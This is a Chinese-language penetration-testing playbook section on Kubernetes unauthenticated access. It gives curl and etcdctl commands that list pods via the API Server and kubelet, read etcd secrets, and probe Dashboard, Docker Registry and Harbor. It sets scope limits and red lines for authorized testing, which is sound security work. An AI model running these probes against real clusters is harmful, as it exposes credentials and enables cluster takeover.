### K8s 入口发现与 API 未授权  `k8s-api-unauth`

黑盒发现集群组件端口并验证 API Server 匿名权限。注意:`/version` 匿名可读是默认行为**不算漏洞**;匿名能列资源才是。
子类:**K8s未授权** · tags: `K8s` `Kubernetes` `未授权` `apiserver`

**前置条件:** IP / 端口清单;云授权项目或资产归属已确认

**攻击链:**

**1. 组件端口识别**
_K8s 集群的标志性端口组_
```
6443   API Server(HTTPS)         10250  kubelet(HTTPS,含鉴权)
10255  kubelet read-only(HTTP)    2379   etcd client
2380   etcd peer                  30000-32767  NodePort 范围
8443   Dashboard / apiserver 变体 10248  kubelet healthz(本机)
# 端口发现归 Phase 3;nmap -p 6443,8443,10250,10255,2379,30000-32767 {NODE}
```

**2. API Server 匿名权限验证**
_三步递进,200/403 语义要分清_
```
# 1) 版本信息:匿名 200 是默认行为,记录但不报
curl -sk "https://{NODE}:6443/version"

# 2) 匿名列资源:403 = RBAC 正常;200 = 未授权(Critical)
curl -sk "https://{NODE}:6443/api/v1/pods" | head -c 300
curl -sk "https://{NODE}:6443/api/v1/namespaces" | head -c 300

# 3) 匿名 selfsubjectaccessreview 不可用 → 换鉴权后的口径(见 11-cloud §cloud-k8s-escape)
# 证据:保留匿名 200 的完整 JSON(脱敏 pod 名 / IP)
```

**3. kubelet 未授权**
_10250 匿名读 / 10255 只读端口_
```
curl -sk "https://{NODE}:10250/pods" | head -c 500     # 匿名 pod 清单(含 env 明文!)
curl -s  "http://{NODE}:10255/pods" | head -c 500      # 只读端口(新版本默认关闭)
# 200 + pod JSON = 未授权;401 = 正常
# pod JSON 的 .spec.containers[].env 常含数据库密码 → 高价值证据(脱敏)
```

**4. etcd 未授权**
_etcd 等于整个集群的数据库,匿名可读 = 集群沦陷_
```
# v2 语义(旧版本)
curl -s "http://{NODE}:2379/v2/keys/?recursive=true" | head -c 300
# v3(经 HTTP JSON 网关,key 需 base64;更通用用 etcdctl)
etcdctl --endpoints=http://{NODE}:2379 get / --prefix --keys-only | head -30
# 命中价值最高的 key:/registry/secrets/...(全部 Secret 明文)
# 证据纪律:读 1 个 secret 键名 + 值的前几字节(脱敏)即停
```

**5. 影响升级边界**
_未授权入口 → 集群接管,报告只证明"能读"_
```
匿名列 pods/secrets → 证明控制权(Critical)
kubelet /exec 需 POST + 鉴权绕过,默认不演示 → 写"可进一步接管",不实际执行
```

### Dashboard / Registry 未授权  `k8s-dashboard-registry`

K8s 生态周边组件:Dashboard 匿名、Docker Registry / Harbor 未授权。独立于 API Server 的一组常见门。
子类:**K8s生态组件** · tags: `K8s` `Dashboard` `Registry` `Harbor`

**前置条件:** 子域 / 端口发现产物

**攻击链:**

**1. Dashboard 匿名访问**
_登录页出现"跳过(Skip)"按钮 = 匿名 token 开启_
```
curl -sk "https://{NODE}:8443/" | grep -iE "skip|跳过"
# 匿名进入后能看什么取决于集群给 system:anonymous 的绑定
# 验证:仅浏览,不点任何部署/删除类操作
```

**2. Docker Registry 未授权**
_5000 端口匿名 API_
```
curl -s "http://{NODE}:5000/v2/_catalog"          # 镜像清单
curl -s "http://{NODE}:5000/v2/{IMAGE}/tags/list" # tag 列表
# 拉镜像验证归"可读";不拉业务镜像全文,列 catalog 即证据
```

**3. Harbor 指纹与已知 CVE**
_项目主页含 harbor 特征时,版本号→CVE 核对_
```
curl -s "https://{HARBOR}/api/v2.0/systeminfo" | jq '.harbor_version?'
# 历史高危(CVE-2019-16097 注册管理员等)按版本核对 NVD,命中走对应公开 PoC 验证
# 验证动作仅到"能创建测试用户"级(scope 允许时),不推送恶意镜像
```

### Node 上 Pod 到集群(衔接)  `k8s-from-node`

已拿到 node / 容器 shell(来源:RCE / 逃逸 / SSRF)后,衔接 11-cloud 的 SA 提权与逃逸链路。
子类:**K8s横向** · tags: `K8s` `ServiceAccount` `横向`

**前置条件:** 已在集群内某 Pod / node 有执行能力

**攻击链:**

**1. 环境判定与 SA 令牌读取**
```
→ ../ssrf-cache-host/11-cloud.md §cloud-k8s-escape 第 1 步(cgroup / SA token / capsh,不重复)
```

**2. SA 权限自检(SelfSubjectAccessReview)**
_只读 API 自查"这个身份能干什么",完整 payload 在 11-cloud 第 3 步_
```
# 关键判定:create pods(→ 特权 Pod 逃逸链) / get secrets(→ 全集群凭据) / exec(→ 任意容器执行)
# 命中即 Critical,报告贴 SSAR 响应 JSON 即可,无需实际建 Pod
```

**3. 逃逸链路**
```
→ 11-cloud.md 第 2/4 步(特权容器 / hostPath Pod)——仅 scope 明确允许时实操
```

## 不要做的事(K8s 红线)

- **禁**:匿名入口验证通过后实际部署 Pod / 删除资源(报告用 SSAR / 匿名 200 JSON 作证据)
- **禁**:etcd 全量导出(读 1–2 个 key 证明即可,全量 = 拖库)
- **禁**:拉取业务镜像全量(列 catalog + tag 即证据)
- **禁**:在业务 namespace 里做任何实验——建测试资源只进 `security-test` 类临时 namespace(且 scope 允许)
